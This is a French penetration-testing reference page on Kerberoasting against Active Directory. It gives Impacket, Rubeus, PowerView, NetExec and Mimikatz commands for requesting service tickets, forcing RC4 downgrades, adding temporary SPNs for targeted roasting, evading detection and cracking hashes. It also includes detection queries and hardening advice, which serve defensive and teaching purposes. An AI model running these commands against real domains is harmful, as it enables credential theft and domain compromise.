# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Le Kerberoasting se concentre sur l’acquisition de tickets TGS, plus précisément ceux associés aux services exécutés sous des comptes utilisateur dans Active Directory (AD), à l’exclusion des comptes machine. Le chiffrement de ces tickets utilise des clés dérivées des mots de passe utilisateur, ce qui permet le cracking offline des identifiants. L’utilisation d’un compte utilisateur comme service est indiquée par une propriété ServicePrincipalName (SPN) non vide.

Tout utilisateur authentifié du domaine peut demander des tickets TGS, aucun privilège spécial n’est donc nécessaire.<sup>[[4]](#references)[[5]](#references)</sup>

### Points clés

- Cible les tickets TGS des services exécutés sous des comptes utilisateur (c’est-à-dire les comptes avec un SPN défini, et non les comptes machine).
- Les tickets sont chiffrés avec une clé dérivée du mot de passe du compte de service et peuvent être crackés offline.
- Aucun privilège élevé n’est requis ; tout compte authentifié peut demander des tickets TGS.

> [!WARNING]
> La plupart des outils publics préfèrent demander des tickets de service RC4-HMAC (etype 23), car ils sont plus rapides à cracker que les tickets AES. Les hashes TGS RC4 commencent par `$krb5tgs$23$*`, ceux en AES128 par `$krb5tgs$17$*` et ceux en AES256 par `$krb5tgs$18$*`. Cependant, de nombreux environnements passent à l’AES-only. Ne supposez pas que seul RC4 est pertinent.
> Évitez également le roasting de type « spray-and-pray ». Le kerberoast par défaut de Rubeus peut interroger et demander des tickets pour tous les SPN, ce qui est bruyant. Énumérez d’abord les principals intéressants et ciblez-les.

### Secrets des comptes de service et coût de la crypto Kerberos

De nombreux services s’exécutent encore sous des comptes utilisateur dont les mots de passe sont gérés manuellement. Le KDC chiffre les tickets de service avec des clés dérivées de ces mots de passe et transmet le ciphertext à tout principal authentifié ; le kerberoasting permet donc un nombre illimité de tentatives offline sans lockout ni télémétrie du DC. Le mode de chiffrement détermine le budget de cracking :

| Mode | Dérivation de clé | Type de chiffrement | Débit approximatif d’une RTX 5090* | Notes |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 avec 4 096 itérations et un salt propre à chaque principal, généré à partir du domaine + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6,8 millions de tentatives/s | Le salt empêche les rainbow tables, mais permet toujours un cracking rapide des mots de passe courts. |
| RC4 + hash NT | MD4 unique du mot de passe (hash NT non salé) ; Kerberos ajoute uniquement un confounder de 8 octets par ticket | etype 23 (`$krb5tgs$23$`) | ~4,18 **milliards** de tentatives/s | ~1000× plus rapide que l’AES ; les attaquants forcent RC4 lorsque `msDS-SupportedEncryptionTypes` l’autorise. |

*Benchmarks de Chick3nman cités dans [l’analyse du Kerberoasting par Matthew Green](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).<sup>[[3]](#references)</sup>

Le confounder de RC4 ne fait que randomiser le keystream ; il n’ajoute aucun coût par tentative. À moins que les comptes de service utilisent des secrets aléatoires (gMSA/dMSA, comptes machine ou chaînes gérées par un vault), la vitesse de compromission dépend uniquement du budget GPU. L’application de types etypes AES-only supprime le downgrade à un milliard de tentatives par seconde, mais les mots de passe humains faibles restent vulnérables à PBKDF2.<sup>[[3]](#references)</sup>

### Attaque

#### Linux

Un exemple pratique de bout en bout utilisant NetExec pour demander des tickets exploitables par roasting et Hashcat pour les cracker est disponible dans la référence [1].<sup>[[1]](#references)</sup>
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Outils multifonctions incluant des vérifications Kerberoast :
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Énumérer les utilisateurs kerberoastable
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1 : Demander des TGS et effectuer un dump depuis la mémoire
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Technique 2 : Outils automatiques
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Une requête TGS génère l’événement de sécurité Windows 4769 (un ticket de service Kerberos a été demandé).

### OPSEC et environnements AES-only

- Demander intentionnellement du RC4 pour les comptes sans AES :
- Rubeus : `/rc4opsec` utilise tgtdeleg pour énumérer les comptes sans AES et demander des tickets de service RC4.
- Rubeus : `/tgtdeleg` avec kerberoast déclenche également des requêtes RC4 lorsque cela est possible.<sup>[[6]](#references)</sup>
- Roaster les comptes AES-only au lieu d’échouer silencieusement :
- Rubeus : `/aes` énumère les comptes avec AES activé et demande des tickets de service AES (etype 17/18).
- Si vous détenez déjà un TGT (PTT ou provenant d’un fichier .kirbi), vous pouvez utiliser `/ticket:<blob|path>` avec `/spn:<SPN>` ou `/spns:<file>` et ignorer LDAP.
- Ciblage, limitation du débit et réduction du bruit :
- Utilisez `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` et `/jitter:<1-100>`.
- Filtrez les mots de passe probablement faibles avec `/pwdsetbefore:<MM-dd-yyyy>` (mots de passe plus anciens) ou ciblez les OU privilégiées avec `/ou:<DN>`.<sup>[[8]](#references)</sup>

Exemples (Rubeus) :
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

Si vous contrôlez ou pouvez modifier un compte, vous pouvez le rendre kerberoastable en ajoutant un SPN :
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Rétrograder un compte pour activer RC4 et faciliter le cracking (nécessite des privilèges d’écriture sur l’objet cible) :
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Targeted Kerberoast via GenericWrite/GenericAll sur un utilisateur (SPN temporaire)

Lorsque BloodHound indique que vous contrôlez un objet utilisateur (par exemple, avec GenericWrite/GenericAll), vous pouvez effectuer de manière fiable un « targeted-roast » sur cet utilisateur spécifique, même s’il ne possède actuellement aucun SPN :<sup>[[9]](#references)</sup>

- Ajoutez un SPN temporaire à l’utilisateur contrôlé pour le rendre exploitable par Kerberoasting.
- Demandez un TGS-REP chiffré avec RC4 (etype 23) pour ce SPN afin de favoriser le cracking.
- Crackez le hash `$krb5tgs$23$...` avec hashcat.
- Supprimez le SPN pour réduire l’empreinte.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux one-liner (targetedKerberoast.py automatise l’ajout d’un SPN -> la demande d’un TGS (etype 23) -> la suppression du SPN) :<sup>[[2]](#references)</sup>
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Cassez la sortie avec l’autodétection de hashcat (mode 13100 pour `$krb5tgs$23$`) :
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Notes de détection : l’ajout ou la suppression de SPN produit des changements dans l’annuaire (Event ID 5136/4738 sur l’utilisateur cible), et la requête TGS génère l’Event ID 4769. Envisagez de limiter le débit et d’effectuer un nettoyage rapide.

Vous trouverez des outils utiles pour les attaques Kerberoast ici : https://github.com/nidem/kerberoast

Si vous rencontrez cette erreur sous Linux : `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, elle est due à un décalage de l’heure locale. Synchronisez-la avec le DC :

- `ntpdate <DC_IP>` (obsolète sur certaines distributions)
- `rdate -n <DC_IP>`

### Kerberoast sans compte de domaine (AS-requested STs)

En septembre 2022, Charlie Clark a montré que si un principal ne requiert pas de pre-authentication, il est possible d’obtenir un ticket de service via un KRB_AS_REQ forgé en modifiant le sname dans le corps de la requête, ce qui permet effectivement d’obtenir un ticket de service au lieu d’un TGT. Cette méthode est similaire à l’AS-REP roasting et ne nécessite pas d’identifiants de domaine valides.

Voir les détails dans l’article de Semperis « New Attack Paths: AS-requested STs ».<sup>[[10]](#references)</sup>

> [!WARNING]
> Vous devez fournir une liste d’utilisateurs, car sans identifiants valides, vous ne pouvez pas interroger LDAP avec cette technique.

Linux

- Impacket (PR #1413) :
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Connexe

Si vous ciblez des utilisateurs vulnérables à l’AS-REP roast, consultez également :

{{#ref}}
asreproast.md
{{#endref}}

### Détection

Le Kerberoasting peut être furtif. Recherchez l’Event ID 4769 provenant des DCs et appliquez des filtres pour réduire le bruit :

- Excluez le nom de service `krbtgt` et les noms de service se terminant par `$` (comptes d’ordinateur).
- Excluez les requêtes provenant de comptes machine (`*$$@*`).
- Uniquement les requêtes réussies (Failure Code `0x0`).
- Suivez les types de chiffrement : RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Ne déclenchez pas d’alerte uniquement sur `0x17`.

Exemple de triage PowerShell :
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Idées supplémentaires :

- Établir une baseline de l’utilisation normale des SPN par hôte/utilisateur ; générer une alerte en cas de fortes rafales de requêtes SPN distinctes provenant d’un seul principal.
- Signaler l’utilisation inhabituelle de RC4 dans les domaines renforcés avec AES.

### Mitigation / Hardening

- Utiliser des comptes gMSA/dMSA ou des comptes machine pour les services. Les comptes gérés possèdent des mots de passe aléatoires de plus de 120 caractères et les renouvellent automatiquement, ce qui rend le cracking hors ligne impraticable.<sup>[[7]](#references)</sup>
- Imposer AES sur les comptes de service en définissant `msDS-SupportedEncryptionTypes` sur AES uniquement (décimal 24 / hexadécimal 0x18), puis renouveler le mot de passe afin que les clés AES soient dérivées.<sup>[[7]](#references)</sup>
- Lorsque cela est possible, désactiver RC4 dans votre environnement et surveiller les tentatives d’utilisation de RC4. Sur les DC, vous pouvez utiliser la valeur de registre `DefaultDomainSupportedEncTypes` pour définir les valeurs par défaut des comptes pour lesquels `msDS-SupportedEncryptionTypes` n’est pas défini. Effectuer des tests approfondis.
- Supprimer les SPN inutiles des comptes utilisateur.<sup>[[7]](#references)</sup>
- Utiliser des mots de passe longs et aléatoires pour les comptes de service (25 caractères ou plus) si les comptes gérés ne sont pas envisageables ; interdire les mots de passe courants et effectuer des audits réguliers.<sup>[[7]](#references)</sup>

## References

- [1] [HTB : Breach – NetExec LDAP kerberoast + cracking avec hashcat en pratique](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting : attaques à faible technicité et fort impact reposant sur la cryptographie Kerberos héritée (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II) : comment attaquer Kerberos ?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Abus de Kerberos dans Active Directory : T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting : demander des TGS chiffrés avec RC4 lorsque AES est activé](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Recommandations de Microsoft pour contribuer à atténuer le Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Documentation de la commande kerberoast de Rubeus](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB : Delegate — identifiants SYSVOL → Targeted Kerberoast → Unconstrained Delegation → DCSync vers DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – New Attack Paths? AS Requested Service Tickets (Charlie Clark, sept. 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
